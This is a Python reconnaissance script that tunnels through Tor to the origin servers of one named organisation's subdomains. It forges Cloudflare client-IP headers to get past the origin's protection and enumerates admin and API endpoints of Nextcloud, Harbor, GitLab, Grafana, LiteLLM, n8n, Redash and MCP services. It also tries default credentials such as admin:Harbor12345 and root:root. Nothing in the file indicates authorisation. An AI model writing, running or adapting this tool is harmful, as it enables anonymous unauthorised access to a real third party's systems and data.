#!/usr/bin/env python3
"""Sequential deep probe with retries — keep Tor stable, retry on 403/errors.
Detects when CF-spoof bypass works and records the successful circuit."""
import socks, ssl, json, sys, re, base64, time

SOCKS_HOST, SOCKS_HOST_PORT = "127.0.0.1", 9050
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4467.114 Safari/537.36"
CF_IP = "172.71.0.1"

def req(host, method, path, extra_headers=None, body=None, timeout=18, ip="201.54.0.48"):
    extra_headers = extra_headers or []
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, SOCKS_HOST, SOCKS_HOST_PORT)
        s.settimeout(timeout)
        s.connect((ip, 443))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
        h = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\nAccept: */*\r\n"
             f"CF-Connecting-IP: {CF_IP}\r\nX-Forwarded-For: {CF_IP}\r\nTrue-Client-IP: {CF_IP}\r\n"
             f"Connection: close\r\n")
        for k,v in extra_headers: h += f"{k}: {v}\r\n"
        if body is not None: h += f"Content-Length: {len(body)}\r\n\r\n{body}"
        else: h += "\r\n"
        s.sendall(h.encode())
        chunks=[]; total=0
        while True:
            try: d=s.recv(8192)
            except: break
            if not d: break
            chunks.append(d); total+=len(d)
            if total>256*1024: break
        s.close()
        raw=b"".join(chunks)
    except Exception as e:
        return {"status":None,"error":str(e)[:100]}
    head,_,body_b = raw.partition(b"\r\n\r\n")
    hs=head.decode("latin1",errors="ignore")
    status=None; server=None; loc=None; cb=None; ct=None
    for line in hs.split("\r\n"):
        if line.startswith("HTTP/"):
            m=re.match(r"HTTP/\S+\s+(\d+)",line)
            if m: status=m.group(1)
        m=re.match(r"Server:\s*(.+)",line,re.I)
        if m: server=m.group(1).strip()
        m=re.match(r"Location:\s*(.+)",line,re.I)
        if m: loc=m.group(1).strip()[:200]
        m=re.match(r"X-Caddy-Block:\s*(.+)",line,re.I)
        if m: cb=m.group(1).strip()
        m=re.match(r"Content-Type:\s*(.+)",line,re.I)
        if m: ct=m.group(1).strip()
    title=None
    tm=re.search(r"<title[^>]*>([^<]*)</title>", body_b.decode("latin1",errors="ignore"), re.I)
    if tm: title=tm.group(1).strip()[:150]
    return {"status":status,"server":server,"size":len(body_b),"location":loc,
            "caddy_block":cb,"content_type":ct,"title":title,
            "body":body_b[:4096].decode("latin1",errors="ignore"),
            "headers":hs.split("\r\n")[:18]}

def probe_with_retry(host, method, path, extra=None, body=None, ip="201.54.0.48", retries=4):
    last=None
    for attempt in range(retries):
        r = req(host, method, path, extra, body, ip=ip)
        last=r
        st=r.get("status")
        # If we got a non-403 non-None response, accept it
        if st and st != "403" and st != "000":
            return r, attempt
        # If 403 with X-Caddy-Block missing, it's the catch-all 403 (bypass failed) — retry
        # If 403 WITH X-Caddy-Block, the service itself returns 403 (e.g. authenticated endpoint) — accept
        if st == "403" and r.get("caddy_block"):
            return r, attempt
        # otherwise retry (sleep a bit)
        time.sleep(1.5)
    return last, retries

# Probe plan: (host, method, path, extra_headers, body, ip)
PLAN = [
    # Nextcloud
    ("drive.dsoconcursos.com.br","GET","/status.php",[],None,"201.54.0.48"),
    ("drive.dsoconcursos.com.br","GET","/login",[],None,"201.54.0.48"),
    ("drive.dsoconcursos.com.br","GET","/ocs/v1.php/cloud/capabilities",[("Accept","application/json")],None,"201.54.0.48"),
    ("drive.dsoconcursos.com.br","GET","/ocs/v2.php/cloud/capabilities",[("Accept","application/json")],None,"201.54.0.48"),
    ("drive.dsoconcursos.com.br","GET","/index.php/login/v2",[],None,"201.54.0.48"),
    ("drive.dsoconcursos.com.br","GET","/remote.php/dav/",[],None,"201.54.0.48"),
    ("drive.dsoconcursos.com.br","GET","/.well-known/nodeinfo",[],None,"201.54.0.48"),
    # Cloudreve
    ("cloudreve.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("cloudreve.dsoconcursos.com.br","GET","/login",[],None,"201.54.0.48"),
    ("cloudreve.dsoconcursos.com.br","GET","/api/v3/site/config",[],None,"201.54.0.48"),
    ("cloudreve.dsoconcursos.com.br","GET","/api/v2/site/config",[],None,"201.54.0.48"),
    ("cloudreve.dsoconcursos.com.br","GET","/api/v1/site/config",[],None,"201.54.0.48"),
    ("cloudreve.dsoconcursos.com.br","GET","/api/v3/user/me",[],None,"201.54.0.48"),
    # Harbor registry
    ("registry.dsoconcursos.com.br","GET","/v2/",[],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/v2/_catalog",[],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/api/v2.0/health",[],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/api/v2.0/projects",[],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/api/v2.0/systeminfo",[],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/api/v2.0/users/current",[],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/v2/_catalog",[("Authorization","Basic " + base64.b64encode(b"admin:Harbor12345").decode())],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/v2/_catalog",[("Authorization","Basic " + base64.b64encode(b"admin:admin").decode())],None,"201.54.0.48"),
    ("registry.dsoconcursos.com.br","GET","/api/v2.0/users/current",[("Authorization","Basic " + base64.b64encode(b"admin:Harbor12345").decode())],None,"201.54.0.48"),
    # RAG
    ("rag.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("rag.dsoconcursos.com.br","GET","/v1/models",[],None,"201.54.0.48"),
    ("rag.dsoconcursos.com.br","GET","/health",[],None,"201.54.0.48"),
    ("rag.dsoconcursos.com.br","GET","/openapi.json",[],None,"201.54.0.48"),
    ("rag.dsoconcursos.com.br","GET","/docs",[],None,"201.54.0.48"),
    # LiteLLM
    ("litellm.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/docs",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/openapi.json",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/v1/models",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/key/info",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/user/info",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/global/spend/logs",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/health",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/config",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/get_sso_url",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/sso",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/fallback/manage/model",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/api/v1/health",[],None,"201.54.0.48"),
    ("litellm.dsoconcursos.com.br","GET","/api/v1/key/info",[],None,"201.54.0.48"),
    # Grafana
    ("grafana.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/login",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/health",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/frontend-settings",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/org",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/admin/stats",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/admin/settings",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/users",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/metrics",[],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/org",[("Authorization","Basic " + base64.b64encode(b"admin:admin").decode())],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/api/health",[("Authorization","Basic " + base64.b64encode(b"admin:admin").decode())],None,"201.54.0.48"),
    ("grafana.dsoconcursos.com.br","GET","/public/plugins/none/",[],None,"201.54.0.48"),
    # GitLab
    ("gitlab.dsoconcursos.com.br","GET","/users/sign_in",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/api/v4/version",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/api/v4/metadata",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/api/v4/projects",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/api/v4/users",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/explore",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/help",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/-/help",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/users/sign_up",[],None,"201.54.0.48"),
    ("gitlab.dsoconcursos.com.br","GET","/api/v4/version",[("Authorization","Basic " + base64.b64encode(b"root:root").decode())],None,"201.54.0.48"),
    # n8n
    ("n8n.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("n8n.dsoconcursos.com.br","GET","/healthz",[],None,"201.54.0.48"),
    ("n8n.dsoconcursos.com.br","GET","/api/v1/active-workers",[],None,"201.54.0.48"),
    ("n8n.dsoconcursos.com.br","GET","/rest/settings",[],None,"201.54.0.48"),
    ("n8n.dsoconcursos.com.br","GET","/rest/login",[],None,"201.54.0.48"),
    ("n8n.dsoconcursos.com.br","GET","/api/v1/users",[],None,"201.54.0.48"),
    ("n8n.dsoconcursos.com.br","GET","/api/v1/workflows",[],None,"201.54.0.48"),
    ("n8n.dsoconcursos.com.br","GET","/api/v1/settings",[],None,"201.54.0.48"),
    # Redash
    ("redash.dsoconcursos.com.br","GET","/login",[],None,"201.54.0.48"),
    ("redash.dsoconcursos.com.br","GET","/status.json",[],None,"201.54.0.48"),
    ("redash.dsoconcursos.com.br","GET","/api/session",[],None,"201.54.0.48"),
    ("redash.dsoconcursos.com.br","GET","/api/queries",[],None,"201.54.0.48"),
    ("redash.dsoconcursos.com.br","GET","/api/data_sources",[],None,"201.54.0.48"),
    ("redash.dsoconcursos.com.br","GET","/api/users",[],None,"201.54.0.48"),
    ("redash.dsoconcursos.com.br","GET","/api/groups",[],None,"201.54.0.48"),
    ("redash.dsoconcursos.com.br","GET","/api/org",[],None,"201.54.0.48"),
    # plataforma
    ("plataforma.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("plataforma.dsoconcursos.com.br","GET","/auth/login",[],None,"201.54.0.48"),
    ("plataforma.dsoconcursos.com.br","GET","/api",[],None,"201.54.0.48"),
    ("plataforma.dsoconcursos.com.br","GET","/api/v1/health",[],None,"201.54.0.48"),
    ("plataforma.dsoconcursos.com.br","GET","/api/v1/me",[],None,"201.54.0.48"),
    ("plataforma.dsoconcursos.com.br","GET","/docs",[],None,"201.54.0.48"),
    ("plataforma.dsoconcursos.com.br","GET","/openapi.json",[],None,"201.54.0.48"),
    # portal
    ("portal.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("portal.dsoconcursos.com.br","GET","/login",[],None,"201.54.0.48"),
    ("portal.dsoconcursos.com.br","GET","/auth/login",[],None,"201.54.0.48"),
    ("portal.dsoconcursos.com.br","GET","/api/v1/health",[],None,"201.54.0.48"),
    # other
    ("suporte.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("prf.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("pf.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("premium.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("uptime.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("tei.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("zipcode.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("tutoryplans.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("study-plan-tracker.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("www.dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    ("dsoconcursos.com.br","GET","/",[],None,"201.54.0.48"),
    # AWS IP MCP services
    ("mcp-aws.dsoconcursos.com.br","GET","/",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","GET","/sse",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","GET","/messages",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","GET","/mcp",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","GET","/health",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","GET","/api",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","GET","/docs",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","GET","/v1/models",[],None,"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","POST","/mcp",[],json.dumps({"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}),"3.83.108.124"),
    ("mcp-aws.dsoconcursos.com.br","POST","/sse",[],json.dumps({"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}),"3.83.108.124"),
    ("mcp-auth.dsoconcursos.com.br","GET","/",[],None,"3.83.108.124"),
    ("mcp-auth.dsoconcursos.com.br","GET","/health",[],None,"3.83.108.124"),
    ("mcp-auth.dsoconcursos.com.br","GET","/.well-known/openid-configuration",[],None,"3.83.108.124"),
    ("mcp-auth.dsoconcursos.com.br","GET","/.well-known/oauth-authorization-server",[],None,"3.83.108.124"),
    ("tools-executor.dsoconcursos.com.br","GET","/",[],None,"3.83.108.124"),
    ("tools-executor.dsoconcursos.com.br","GET","/health",[],None,"3.83.108.124"),
    ("tools-executor.dsoconcursos.com.br","GET","/docs",[],None,"3.83.108.124"),
    ("tools-executor.dsoconcursos.com.br","GET","/api/v1/tools",[],None,"3.83.108.124"),
]

def main():
    results=[]
    print(f"[*] {len(PLAN)} sequential probes with retry", file=sys.stderr)
    for i,(host,method,path,extra,body,ip) in enumerate(PLAN):
        r, attempts = probe_with_retry(host, method, path, extra, body, ip=ip)
        results.append({"host":host,"method":method,"path":path,"ip":ip,"attempts":attempts,**r})
        st = r.get("status")
        cb = r.get("caddy_block")
        flag = ""
        if st in ("200","201","301","302","307","308"): flag="**LIVE**"
        elif st == "401": flag="[AUTH]"
        elif st == "403" and not cb: flag="[CF-BLOCK]"
        elif st == "403" and cb: flag="[403-service]"
        print(f"[{i+1:3}/{len(PLAN)}] {host}{path} ({method}) -> {st} {flag} cb={cb} sz={r.get('size',0)} tries={attempts+1}")
        if st in ("200","201","401") and r.get("body"):
            b = r["body"][:280].replace("\n"," ")
            if r.get("content_type") and ("json" in r["content_type"] or "text" in r["content_type"] or r.get("size",0) < 800):
                print(f"      body: {b!r}")
        if r.get("title"):
            print(f"      title: {r['title']!r}")
        if r.get("location"):
            print(f"      loc: {r['location']}")
        sys.stdout.flush()
    json.dump(results, open("raw/deep_probe_seq.json","w"), indent=2)
    print("\n=== DONE — saved raw/deep_probe_seq.json ===")

if __name__=="__main__":
    main()
